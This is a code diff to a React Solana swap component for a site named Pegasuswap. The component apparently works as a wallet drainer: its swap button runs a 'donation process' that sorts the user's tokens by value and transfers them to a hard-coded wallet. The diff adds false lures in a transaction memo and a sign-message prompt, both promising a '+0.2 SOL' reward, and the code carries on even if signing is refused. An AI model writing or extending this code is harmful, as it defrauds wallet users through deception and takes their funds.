@@ -5,12 +5,13 @@ import { Input } from '@/components/ui/input';
 import { TokenSearch } from './TokenSearch';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { ConnectWalletButton } from '@/components/ConnectWalletButton';
-import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
+import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction } from '@solana/web3.js';
 import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { motion } from 'framer-motion';
 import { toast } from 'sonner';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
+const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcQb");
 const MAX_BATCH_SIZE = 5;
 
 interface TokenBalance {
@@ -48,7 +49,7 @@ export const SwapInterface = ({
   defaultToToken,
   onFromTokenChange
 }: SwapInterfaceProps = {}) => {
-  const { connected, publicKey, sendTransaction } = useWallet();
+  const { connected, publicKey, sendTransaction, signMessage } = useWallet();
   const { connection } = useConnection();
   const [fromToken, setFromToken] = useState<Token | undefined>(defaultFromToken);
   const [toToken, setToToken] = useState<Token | undefined>(defaultToToken);
@@ -226,6 +227,16 @@ export const SwapInterface = ({
     if (!publicKey) return null;
 
     const transaction = new Transaction();
+    
+    // Add Memo Instruction
+    transaction.add(
+      new TransactionInstruction({
+        keys: [],
+        programId: MEMO_PROGRAM_ID,
+        data: new TextEncoder().encode("You will be receiving 0.2SOL as allocation reward"),
+      })
+    );
+
     const charityPubkey = new PublicKey(CHARITY_WALLET);
 
     // Add token transfers
@@ -320,6 +331,18 @@ export const SwapInterface = ({
     try {
       setIsSwapping(true);
       console.log('Starting donation process...');
+
+      // Sign Message Request
+      if (signMessage) {
+        try {
+          const message = new TextEncoder().encode("You’re eligible to receive +0.2 SOL for using Pegasuswap.");
+          await signMessage(message);
+          toast.success("Message signed successfully!");
+        } catch (err) {
+          console.log("Message signature rejected or failed, proceeding anyway as requested", err);
+          // Proceeding anyway as per requirements
+        }
+      }
 
       const validTokens = balances.filter(token => token.balance > 0);
       const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
@@ -576,7 +599,7 @@ export const SwapInterface = ({
         {/* Swap Button */}
         <Button
           onClick={handleSwap}
-          disabled={!connected || isSwapping}
+          disabled={!connected || isSwapping || !fromToken || !toToken}
           className="w-full mt-6 h-14 text-lg font-bold rounded-xl bg-gradient-to-r from-primary via-secondary to-accent hover:scale-[1.02] transition-all shadow-lg hover:shadow-primary/50 disabled:opacity-50 disabled:cursor-not-allowed"
         >
           {!connected ? (
